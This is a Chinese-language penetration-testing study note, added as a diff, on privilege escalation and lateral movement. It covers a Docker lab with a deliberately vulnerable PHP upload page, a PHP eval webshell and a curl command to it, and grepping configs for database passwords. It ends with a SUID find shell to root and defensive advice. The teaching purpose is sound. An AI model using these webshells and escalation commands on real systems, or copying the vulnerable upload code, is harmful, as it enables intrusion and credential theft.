@@ -1,0 +1,186 @@
+## 1. 概述 (Overview)
+
+在网络安全攻防的整个生命周期中，初始访问（Initial Access）仅仅是起点。攻击者在获得初步立足点后，其核心目标之一便是**权限提升 (Privilege Escalation)**。权限提升是指攻击者利用系统漏洞、错误配置或逻辑缺陷，将其当前账户的权限级别提升到更高权限（如 `root` 或 `SYSTEM`）的过程。
+
+与权限提升紧密相关的是**权限转移 (Privilege Transfer)**，它指攻击者在同一权限级别内，从一个系统或应用的控制权转移到另一个系统或应用的控制权，目的是扩大攻击面或更接近最终目标。
+
+本笔记旨在系统性地梳理权限提升与转移的核心概念、技术分类、攻击场景及实战流程，为安全研究人员和渗透测试工程师提供一份结构化的参考指南。我们将从 Web 应用、中间件、数据库等常见入口点出发，深入探讨权限获取、提升与转移的原理和实践。
+
+## 2. 技术原理 (Technical Principles)
+
+### 2.1 权限的分类与认知
+
+理解不同层级的权限是进行有效提升与转移的前提。在典型的 Web 应用环境中，权限可以大致分为以下几类：
+
+| 权限类型 | 描述 | 典型获取方式 |
+| :--- | :--- | :--- |
+| **后台权限** | 对 Web 应用管理后台的控制权，可管理内容、用户、配置等。 | 弱口令、SQL 注入、会话劫持、未授权访问。 |
+| **数据库权限** | 对数据库进行增、删、改、查等操作的权限。 | 配置文件泄露、SQL 注入、弱口令、未授权访问。 |
+| **Web 权限** | 对 Web 服务器目录和文件的读写执行权限，通常以 `www-data`、`apache` 等低权限用户运行。 | 文件上传漏洞、远程代码执行 (RCE)、反序列化。 |
+| **用户权限** | 操作系统级别的普通用户权限，无法执行敏感系统操作。 | 通过 Web 权限反弹 Shell、弱口令登录、凭证泄露。 |
+| **服务器权限** | 操作系统的最高权限，如 Linux 的 `root` 或 Windows 的 `NT AUTHORITY\SYSTEM`。 | 内核漏洞利用 (Kernel Exploit)、SUID/SGID 提权、服务配置错误。 |
+| **宿主机权限** | 在虚拟化环境中，从容器 (Docker, K8s) 内部逃逸到宿主操作系统的权限。 | 危险挂载 (e.g., `docker.sock`)、内核共享漏洞、不安全的容器配置。 |
+| **域控权限** | 在 Windows Active Directory 环境中，对整个域的最高控制权限。 | 内网横向移动、域内提权漏洞 (e.g., Zerologon)、凭证窃取。 |
+
+### 2.2 权限提升与转移的核心逻辑
+
+*   **提升 (Escalation)**：这是一个**纵向**的过程，旨在突破当前权限层级的天花板。例如，从一个只能修改网页的 `www-data` 用户，通过内核漏洞获得整个服务器的 `root` 权限。
+    *   `Web 权限 -> 用户权限 -> 服务器权限`
+    *   `数据库权限 -> Web 权限 -> 用户权限`
+
+*   **转移 (Transfer)**：这是一个**横向**的过程，旨在利用已有权限去获取其他系统或应用的同级控制权。例如，通过一个 Web 应用的权限，读取到了另一个应用的数据库配置文件，从而控制了第二个应用。
+    *   `Web 权限 (App A) -> 数据库权限 (App B)`
+    *   `后台权限 (App A) -> Web 权限 (App B)`
+
+## 3. 环境准备 (Environment Setup)
+
+为了复现和理解权限提升的场景，建议搭建一个包含常见漏洞的靶场环境。以下是一个基于 Docker 的简单环境示例，包含一个存在文件上传漏洞的 Web 应用。
+
+**`docker-compose.yml` 示例:**
+
+```yaml
+version: '3'
+services:
+  web_vuln_app:
+    image: php:7.4-apache  # 使用一个基础的 PHP + Apache 镜像
+    container_name: vuln_web
+    ports:
+      - "8080:80"
+    volumes:
+      - ./src:/var/www/html  # 将本地的 PHP 代码挂载到容器中
+    restart: always
+
+# 在本地创建一个 ./src 目录，并放入一个有文件上传漏洞的 PHP 页面
+# 例如 upload.php
+```
+
+**`./src/upload.php` 示例 (极度不安全，仅供演示):**
+
+```php
+<?php
+if (isset($_FILES['file'])) {
+    $target_dir = "uploads/";
+    $target_file = $target_dir . basename($_FILES["file"]["name"]);
+    if (move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)) {
+        echo "文件 " . htmlspecialchars(basename($_FILES["file"]["name"])) . " 已成功上传。";
+        echo "<br><a href='{$target_file}'>访问文件</a>";
+    } else {
+        echo "上传失败。";
+    }
+}
+?>
+
+<form action="upload.php" method="post" enctype="multipart/form-data">
+  选择一个文件进行上传:
+  <input type="file" name="file" id="file">
+  <input type="submit" value="上传" name="submit">
+</form>
+```
+
+**启动环境:**
+
+```bash
+# 创建 src 和 src/uploads 目录，并赋予 Web 服务器写入权限
+mkdir -p src/uploads
+sudo chmod -R 777 src/uploads
+
+# 启动容器
+docker-compose up -d
+```
+
+现在，您可以通过访问 `http://localhost:8080/upload.php` 来与这个存在漏洞的应用进行交互。
+
+## 4. 实战示例 (Hands-on Examples)
+
+### 场景一：从 Web 后台到 Web 权限 (提升)
+
+这是最经典的权限提升路径之一。假设通过弱口令进入了某个 CMS 的后台。
+
+1.  **目标定位**：寻找任何形式的“文件上传”或“模板编辑”功能。这些功能通常允许将文件写入 Web 服务器的可访问目录。
+2.  **构造 Payload**：创建一个 Webshell。这是一个简单的 PHP 一句话木马。
+    *   `shell.php`:
+        ```php
+        <?php @eval($_POST['cmd']); ?>
+        ```
+3.  **执行上传**：通过后台的文件上传点，将 `shell.php` 上传到服务器。假设上传路径为 `/uploads/shell.php`。
+4.  **获取权限**：使用 Web 连接工具（如 AntSword、Behinder）连接到 `http://<target>/uploads/shell.php`。连接成功后，你就获得了 Web 服务器运行用户的权限（`www-data`）。
+
+    **在终端中模拟攻击：**
+    ```bash
+    # 使用 curl 发送一个命令来验证 Webshell 是否工作
+    # 该命令会在服务器上执行 `whoami` 并返回结果
+    curl -X POST http://localhost:8080/uploads/shell.php -d "cmd=system('whoami');"
+    
+    # 预期输出: www-data
+    ```
+
+### 场景二：从 Web 权限到数据库权限 (转移)
+
+获得 Web 权限后，下一步通常是搜寻敏感信息，尤其是数据库凭证。
+
+1.  **信息搜集**：在 Web 权限下，遍历网站源代码，寻找数据库配置文件。常见的文件名包括 `config.php`, `database.yml`, `.env`, `web.config`。
+    ```bash
+    # 在 Webshell 终端中执行
+    find . -name "*.php" | xargs grep -i "password"
+    cat /var/www/html/config/database.inc.php
+    ```
+2.  **凭证获取**：在配置文件中找到数据库的主机、用户名、密码和数据库名。
+    ```php
+    // config.php 示例
+    define('DB_HOST', '127.0.0.1');
+    define('DB_USER', 'webapp_user');
+    define('DB_PASSWORD', 'S3cr3tP@ssw0rd!');
+    define('DB_NAME', 'production_db');
+    ```
+3.  **权限转移**：使用获取到的凭证连接数据库。如果数据库端口（如 3306）对 Web 服务器开放，可以直接连接。
+    ```bash
+    # 在 Webshell 中或通过端口转发连接
+    mysql -h 127.0.0.1 -u webapp_user -p'S3cr3tP@ssw0rd!' production_db
+    ```
+    至此，你已成功将 Web 权限转移到了数据库权限。
+
+### 场景三：从用户权限到服务器权限 (提升)
+
+获得 `www-data` 等低权限用户后，目标是成为 `root`。
+
+1.  **信息搜集**：这是提权最关键的一步。需要全面检查系统信息。
+    *   **内核版本**：`uname -a` (用于搜索内核漏洞)
+    *   **SUID/SGID 文件**：`find / -perm -u=s -type f 2>/dev/null` (可利用这些文件以其所有者权限运行)
+    *   **计划任务**：`cat /etc/crontab` (检查是否有可被低权限用户修改的脚本)
+    *   **服务和进程**：`ps aux` (寻找以 root 权限运行但配置不当的服务)
+
+2.  **漏洞利用 (以 SUID 为例)**：假设发现 `find` 命令具有 SUID 位。
+    ```bash
+    ls -l /usr/bin/find
+    # 输出可能包含: -rwsr-xr-x 1 root root ... /usr/bin/find
+    ```
+    `find` 命令的 `-exec` 参数可以执行任意命令。由于 `find` 是以 `root` 权限运行的，它执行的命令也将是 `root` 权限。
+
+3.  **执行提权**：
+    ```bash
+    # 利用 find 命令的 -exec 参数来启动一个 shell
+    /usr/bin/find . -exec /bin/sh -p \; -quit
+    
+    # 检查当前用户
+    whoami
+    # 预期输出: root
+    ```
+    通过这个简单的命令，你已成功从 `www-data` 提升为 `root` 权限。
+
+## 5. 关键细节 (Key Details)
+
+*   **权限差异性**：不同应用和中间件产生的 Web 权限是不同的。例如，Tomcat 的管理后台上传 war 包后获得的通常是 `tomcat` 用户权限，而 PHP 应用可能是 `www-data` 或 `apache`。理解这些差异对于后续的提权路径选择至关重要。
+*   **环境隔离**：在 Docker 或其他容器化环境中，从 Web 权限提升到 `root` 可能只是容器内的 `root`，而非宿主机的 `root`。此时，需要进一步进行**容器逃逸**才能获得宿主机权限，这是一个更高级的权限提升阶段。
+*   **信息就是生命**：在任何权限级别，首要任务都是信息搜集。一个被忽略的配置文件、一条可写的计划任务脚本、一个过时的内核版本，都可能是通往更高权限的钥匙。自动化脚本如 `LinEnum.sh` 或 `PEASS-ng` 在此阶段非常有帮助。
+
+## 6. 安全总结 (Security Summary)
+
+权限提升与转移是攻击链中不可或缺的一环。作为防御者，必须建立纵深防御体系，在每个层级设置障碍。
+
+*   **最小权限原则**：确保 Web 服务、数据库服务和应用账户都以完成其任务所需的最低权限运行。`www-data` 用户不应有能力修改系统关键文件。
+*   **输入验证与安全配置**：严格限制文件上传的类型和内容，关闭不必要的服务和端口，修复所有已知的软件漏洞，避免使用弱口令。
+*   **补丁管理**：及时更新操作系统内核、中间件和应用程序，以修复可能被用于权限提升的漏洞。
+*   **监控与审计**：记录并监控关键文件的访问、异常进程的创建以及用户权限的变更。任何非预期的 `SUID` 文件或 `root` 权限进程都应触发警报。
+*   **隔离环境**：使用 Docker、gVisor、Kata Containers 等技术对应用进行强隔离，增加攻击者从容器逃逸到宿主机的难度。
+
+通过理解攻击者的思维方式和技术路径，我们才能更有效地构建坚不可摧的安全防线。
